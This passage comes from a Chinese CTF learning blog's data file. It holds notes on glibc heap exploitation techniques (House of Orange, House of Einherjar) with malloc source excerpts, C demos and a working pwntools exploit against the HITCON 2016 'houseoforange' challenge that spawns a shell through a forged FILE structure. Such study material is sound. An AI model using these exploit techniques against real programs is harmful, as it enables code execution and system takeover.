class="string">&quot;buf[2]+0x28: %#lx\n&quot;</span>,buf[<span class="number">7</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf[2]的size: %#lx\n\n&quot;</span>,buf[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*把a 放入fastbins ,把buf链入fastbin*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m先free a,在通过修改a的fd，把buf[2]链入，随后free b触发:\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    *a=(<span class="type">size_t</span>)(&amp;buf[<span class="number">2</span>]);</span><br><span class="line">    <span class="comment">/*触发malloc_consolidate*/</span></span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*申请大堆块把buf放进largebin，修改buf size*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m先修改buf 的size，使其可以被放入large bin中:\033[0m\n&quot;</span>);</span><br><span class="line">    buf[<span class="number">3</span>]=<span class="number">0xa00001</span>;</span><br><span class="line">    b=<span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf[2]的size: %#lx\n\n&quot;</span>,buf[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">/*再次修改size*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m把buf 的size 修改为很大，使得可以分配到我们的target：\033[0m\n&quot;</span>);</span><br><span class="line">    buf[<span class="number">3</span>]=<span class="number">0xfffffffffffffff1</span>;</span><br><span class="line">    <span class="comment">/**/</span></span><br><span class="line">    c=<span class="built_in">malloc</span>(<span class="number">0xffffffffffffff80</span>);</span><br><span class="line">    d=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;分配到的d:%p\n&quot;</span>,d);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target: %p\n&quot;</span>,target);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="为什么fakechunk-后要设置1？"><a href="#为什么fakechunk-后要设置1？" class="headerlink" title="为什么fakechunk 后要设置1？"></a>为什么fakechunk 后要设置1？</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><ol><li>这是因为后续free(b) ，触发malloc_consolidate,时会检测nextinuse。如果是0就会触发unlink，而我们的利用是不能走这条路的，所以为了绕过，就需要把nextinuse置1.</li><li>同时因为这个绕过在前，所以我们先将fakechunk 的size设置为很小的0x20，这样置1的位置也很近，更方便。</li><li>在检测中是nextinuse，因为我们的size为0。通过buf[6]+0，得到的还是buf[6]自己,所以只需要在这里置1就ok了.</li></ol><h2 id="为什么fakechunk前要置0xfffffffffffffff0？"><a href="#为什么fakechunk前要置0xfffffffffffffff0？" class="headerlink" title="为什么fakechunk前要置0xfffffffffffffff0？"></a>为什么fakechunk前要置0xfffffffffffffff0？</h2><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/d7c462933cf8847287b123a9d1dc54f5.png" alt="_int_malloc中的检测"></p><ol><li>在后续malloc(c)是，也就将largebin 迁移到target的调用中，有检测。就是[buf+size] -size，当这个结果为0 时，才能正常进行。</li><li>因为我们将size设置为了0xfffffffffffffff0，所以[buf+size]要等于0xfffffffffffffff0。那么[buf+size]又是何处呢？</li><li>其实就是buf-0x10。图中的r15，就是我们之前链入fastbins 的地址。</li></ol><h2 id="关键部分演示"><a href="#关键部分演示" class="headerlink" title="关键部分演示"></a>关键部分演示</h2><h3 id="把buf链入fastbins"><a href="#把buf链入fastbins" class="headerlink" title="把buf链入fastbins"></a>把buf链入fastbins</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630032850548.png" alt="buf入fastbins"></p><h3 id="free-b触发malloc-consolidate"><a href="#free-b触发malloc-consolidate" class="headerlink" title="free b触发malloc_consolidate"></a>free b触发malloc_consolidate</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033107787.png" alt="触发malloc_consolidate"></p><h3 id="把buf放入largebin"><a href="#把buf放入largebin" class="headerlink" title="把buf放入largebin"></a>把buf放入largebin</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033400440.png" alt="image-20250630033400440"><br>因为大小不够，所以会被放入large bin</p><h3 id="malloc，迁移largebins"><a href="#malloc，迁移largebins" class="headerlink" title="malloc，迁移largebins"></a>malloc，迁移largebins</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033528949.png" alt="image-20250630033528949"></p><ol><li>这次大小足够了可以分配</li><li>这个偏移计算是$[（target-0x10）-buf]-0x10$</li></ol><h3 id="分配target"><a href="#分配target" class="headerlink" title="分配target"></a>分配target</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630034203589.png" alt="image-20250630034203589"><br>下一步就可以分配到target了</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> House of XXX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of Orange</title>
      <link href="/2025/06/22/heap/House%20of%20Orange/"/>
      <url>/2025/06/22/heap/House%20of%20Orange/</url>
      
        <content type="html"><![CDATA[<h1 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看了将近五天的博客，一步一步弄，总算是把步骤都搞清楚了。其实光一个House of  Orang的点不用看怎么久。只是后续unsorted bin attack 和 FSOP 的利用，确实要细看。这道题也无愧是经典。也是渐渐有学习的感觉了。让我们来细细解析这个手法，感受一下pwn的美妙。</p><p>ps：本文中，没有相关源码的展示和分析，考虑后续去做一个对应的专门的分析板块。</p><h2 id="house-of-orange-简介"><a href="#house-of-orange-简介" class="headerlink" title="house of orange 简介"></a>house of orange 简介</h2><p>使用场景：当程序中没有free功能时，而我们又需要得到free chunk，就可以通过这个手段来获取free chunk<br>使用条件：需要要堆溢出漏洞，可以修改top chunk的size<br>利用原理：正常情况下（指绕过检查），如果申清的堆块大小大于top chunk大小，那么top chunk就会被放进unsorted bin中。然后重新映射或扩展一个新的top chunk。<br>绕过检查：1.top chunk 的size 必须大于MINSIZE ，且小于我们申请的堆块大小。2.top chunk 的pre_inuse 必须为“1”。3.top chunk 的size + top chunk 的addr 必须页对齐(最后3为是0x00)。4.我们申请的堆块必须小于0x2000</p><h2 id="unsorted-bin-attack-FSOP-简介"><a href="#unsorted-bin-attack-FSOP-简介" class="headerlink" title="unsorted bin attack &amp; FSOP 简介"></a>unsorted bin attack &amp; FSOP 简介</h2><h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>使用场景：一般是辅助其他攻击手段的，本身这个手法并没有什么大作用<br>使用条件：堆溢出或者uaf，可以编辑unsorted bin 中链尾的 bk<br>使用原理：修改unsorted bin链尾bk，可以往bk中写入main_arena+88的地址<br>注意事项：在此之后，无法再从unsorted bin中申请堆块</p><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>篡改__IO_list_all 和 _chain，来劫持IO_FILE.然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow.<br>1.在这样的一个利用链里，前面的步骤让我们在__IO_list_all 的表头写入了main_arena+88 。破坏了这个结构体的结构。此时chain字段的内容被修改为main_arena 中 smallbin chunk 的地址。<br>2.所以，下一个结构体就会是，我们的small bin 的chunk。此时控制这个chunk 的内容，就能控制__IO_list_all ，按照要求部署结构。再下一次malloc 时，就可以触发。<br>3.这里需要注意，__IO_list_all 这个结构是变化的，首先在溢出修改完时，这个的结构是，头在main_arena+88 的位置.此时的chain 指向small bin chunk.所以下一次,表头就是,这个chunk 的头部，里面的字段也会是对应的内容。我们需要控制的flag字段，vtable字段，还有中间的相关字段</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h3><p>分析一下exp吧，具体的一个流程有时间再补充一下。</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526224440703.png" alt="image-20250526224440703"><br>1.这一段主要是在泄露libc。先正常添加一个堆块，然后利用溢出去修该top chunk 的size 为0xfa1，紧接着申清大堆块完成house of orange的利用。<br>2.然后的add,是为了把libc泄露出来，因为本题没有uaf，所以只能这样。把fd覆盖后，接受bk。</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526224818280.png" alt="image-20250526224818280"><br>1.这里还是泄露为主，泄露堆地址，这个是题目本身会在申请的堆块里写入地址。同时没有<code>&quot;\x00&quot;</code>覆盖，导致后续的泄露。这里把上一个堆块的fd 和 bk 位置都填充满，去泄露下面的信息。</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526225200971.png" alt="image-20250526225200971"><br>1.这段时unsorted bin attack 和 FSOP 一起的，似乎这个必须一起，不能分开。第五行就是对之前unsorter bin 中chunk bk 的复写。<br>2.同时，这个位置也是伪造的small bin。也是后续的第二个FILE 的结构体。<br>3.感觉其实应该也不是只能这么写吧，这个应该是所需字节数最少的写法，后续可以尝试把两个分开写写看能不能成功.<br>4.现在验证了，这个偏移是不能乱填的，因为必须把原先的堆块的size 覆盖掉，不能随便伪造其他堆块。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">ip=<span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port=<span class="number">29775</span></span><br><span class="line">io,elf=loadfile(<span class="string">&quot;houseoforange_hitcon_2016&quot;</span>,ip,port)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/tsq/glibc-all-in-one/libs/2.23_0ubuntu10_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Length of name :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">io.sendafter(<span class="string">&quot;Name :&quot;</span>,content)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Price of Orange&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Color of Orange&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Length of name :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">io.sendafter(<span class="string">&quot;Name:&quot;</span>,content)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Price of Orange&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Color of Orange&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000002000000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>))</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">0x18</span>)</span><br><span class="line">leak=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=leak-<span class="number">0x3c5188</span></span><br><span class="line"></span><br><span class="line">io_list_all=libcbase+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">sys_addr=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0x20</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">leak_heap=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">logvalue(<span class="string">&quot;libcbase&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">logvalue(<span class="string">&#x27;leak_heap&#x27;</span>,<span class="built_in">hex</span>(leak_heap))</span><br><span class="line">payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) <span class="comment">#old top chunk prev_size &amp; size 同时也是fake file的_flags字段</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) <span class="comment">#old top chunk fd &amp; bk</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x430</span>)<span class="comment">#chain</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x508</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)</span><br><span class="line">edit(<span class="number">0x1000</span>,payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16712469.html">关于house of orange(unsorted bin attack &amp;&amp;FSOP)的学习总结 - ZikH26 - 博客园</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> House of XXX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of Einherjar</title>
      <link href="/2025/06/22/heap/House%20of%20%20Einherjar/"/>
      <url>/2025/06/22/heap/House%20of%20%20Einherjar/</url>
      
        <content type="html"><![CDATA[<h1 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​总算是开始系统的梳理一遍堆溢出中的一个利用手法，也是很久没有写笔记了。这一片也是第一篇不是写题目做的笔记，是为了先看完所有的一个利用方法，再更好得去做题吧。<br>​从这篇开始，依次做完23个demo的学习文章</p><h2 id="相关源码"><a href="#相关源码" class="headerlink" title="相关源码"></a>相关源码</h2><p>​<strong>也是有源码分析了</strong>文件路径(malloc&#x2F;malloc.c)</p><h3 id="consolidate-backward"><a href="#consolidate-backward" class="headerlink" title="consolidate backward"></a>consolidate backward</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​这段代码是向后合并的操作，p是刚刚被释放的堆块。如果它的prev_inuse位是0 的话(正常情况是上一个相邻堆块被释放)，就会执行这段代码。先把前一个堆块的大小(p-&gt;prev_size)赋给prevsize，把p的大小修改为两个堆块的大小之和。通过p的地址减去上一个堆块的大小，找到合并后，p应该在的地址，并更新p。再用新的p去执行unlink。</p><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action,      \</span></span><br><span class="line"><span class="meta">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">       P, AV);      \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>​unlink操作在这里没有具体的利用，我们只是最后需要绕过这样的一个检测。让它可以正常进行合并。关于unlink前半部分的代码，会在unlink专属的文章中介绍。这里第9行是针对lagebin的一个检测，而在我们这个利用手法中，基本都是lagebin，所以我们需要对这个fd_nextsize和bk_nextsize,做一个绕过的检测。因为当lagebin中只有一个堆块时，fd_nextsize和bk_nextsize,都指p自己，所以我们把这两个设置为p的地址即可。</p><h3 id="consolidate-into-top"><a href="#consolidate-into-top" class="headerlink" title="consolidate into top"></a>consolidate into top</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​这段就是就是把与topchunk 相邻的空闲堆块与top chunk合并。并更新top chunk的大小和地址。</p><h2 id="原理和条件"><a href="#原理和条件" class="headerlink" title="原理和条件"></a>原理和条件</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>​其实原理，我觉得就是指利用的思路，并不是单纯的指源码的操作，这不是我们利用手法的原理。<br>​这里是这样，利用某些手段伪造出一个fakechunk，这个chunk位于我们想要分配的目的地址上(记为target)。 同时，我们利用可以正常分配到的一个 chunk (记为p)。通过修改p 的 prevsize和pre_inuse,让p 和target 合并为一个堆块，当然p本身是与topchunk相邻的。此时，target 和 p 都被 topchunk 合并为新的topchunk。此时topchunk 的地址，就迁移到了 target 所在的地址。那么再次分配堆地址，就可以把这个空间分配到手。</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>​1.伪造fakechunk ，需要泄露 栈地址和堆地址。总之要能泄露地址<br>​2.off-by-one 或off-by-null，要能修改pre_inuse。</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span>* a;</span><br><span class="line"><span class="type">uint8_t</span>* b;</span><br><span class="line"><span class="type">uint8_t</span>* c;</span><br><span class="line"></span><br><span class="line">a=(<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x38</span>);<span class="comment">/*假设，我们要利用a去溢出到下一个堆块。*/</span></span><br><span class="line"><span class="type">size_t</span>* a_addr=(<span class="type">size_t</span> *)(a-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="type">size_t</span>  a_size=malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m这里，我们申清一个堆块a,假设存在溢出漏洞。需要通过a去溢出：\033[0m\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a的地址(包含chunk头)：%p\n&quot;</span>,a_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a的大小(不含chunk头)：%lx\n\n&quot;</span>,a_size);</span><br><span class="line">        </span><br><span class="line"><span class="type">size_t</span> fakechunk[<span class="number">6</span>];<span class="comment">/*这里，我们通过某种方法伪造了fakechunk。*/</span></span><br><span class="line">fakechunk[<span class="number">0</span>]=<span class="number">0x100</span>,fakechunk[<span class="number">1</span>]=<span class="number">0x100</span>;</span><br><span class="line">fakechunk[<span class="number">2</span>]=(<span class="type">size_t</span>)fakechunk;</span><br><span class="line">fakechunk[<span class="number">3</span>]=(<span class="type">size_t</span>)fakechunk;</span><br><span class="line">fakechunk[<span class="number">4</span>]=(<span class="type">size_t</span>)fakechunk;</span><br><span class="line">fakechunk[<span class="number">5</span>]=(<span class="type">size_t</span>)fakechunk;</span><br><span class="line"><span class="built_in">printf</span>(<span 